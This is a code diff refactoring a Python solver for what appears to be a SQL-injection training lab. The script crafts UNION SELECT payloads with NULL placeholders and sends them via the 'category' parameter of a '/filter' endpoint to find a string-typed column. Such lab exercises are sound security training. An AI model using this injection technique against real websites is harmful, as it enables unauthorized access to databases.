@@ -9,15 +9,14 @@ class Lab(lab_03.Lab):
     """Wrapper"""
 
     # pylint: disable=too-many-arguments
-    def column_string_type(self, key: str, path: str, text: str, column: int,
-                           size: int) -> bool:
+    def column_is_string_type(self, column: int, text: str = "a") -> bool:
         """Column index contains text"""
-        nulls = ["NULL"] * size
+        nulls = ["NULL"] * self.column_count()
         nulls[column] = f"'{text}'"
         query = "'+UNION+SELECT+{}--".format(",".join(nulls))
-        payload = {key: query}
+        payload = {self.key: query}
         payload_str = "&".join("%s=%s" % (k, v) for k, v in payload.items())
-        response = self.session.get(self.url + path, params=payload_str)
+        response = self.session.get(self.url + self.path, params=payload_str)
         return response.status_code == 200
 
     def query_string(self) -> str:
@@ -30,19 +29,18 @@ class Lab(lab_03.Lab):
             raise RuntimeError("Cannot find query string")
         return hint.text.split()[-1].strip("'")
 
-    def column_index_for_query(self, key: str, path: str, text: str) -> int:
+    def column_index_for_query(self, text: str) -> int:
         """Get the index for the query string"""
-        column_count = self.column_count(key, path)
-        for i in range(column_count):
-            if self.column_string_type(key, path, text, i, column_count):
+        for i in range(self.column_count()):
+            if self.column_is_string_type(column=i, text=text):
                 return i
         raise RuntimeError(f"Failed to identify index for {text}")
 
 def main() -> None:
     """Entry point"""
-    site = Lab()
+    site = Lab(key="category", path="/filter")
     text = site.query_string()
-    print(site.column_index_for_query(key="category", path="/filter", text=text))
+    print(site.column_index_for_query(text=text))
 
 if __name__ == "__main__":
     main()
